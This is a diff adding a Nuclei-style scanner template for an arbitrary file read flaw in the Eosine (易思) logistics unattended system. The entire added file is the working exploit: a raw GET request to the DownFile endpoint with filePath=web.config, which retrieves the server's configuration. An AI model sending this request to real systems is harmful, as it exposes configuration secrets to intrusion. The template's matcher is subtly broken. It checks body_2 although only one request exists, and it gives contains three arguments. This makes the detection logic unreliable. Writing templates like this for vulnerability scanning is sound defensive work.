@@ -1,0 +1,20 @@
+id: eosine-downfile-read
+info:
+  name: 易思智能物流无人值守系统 downfile 任意文件读取
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body_2,"redisconfig","<?xml")'
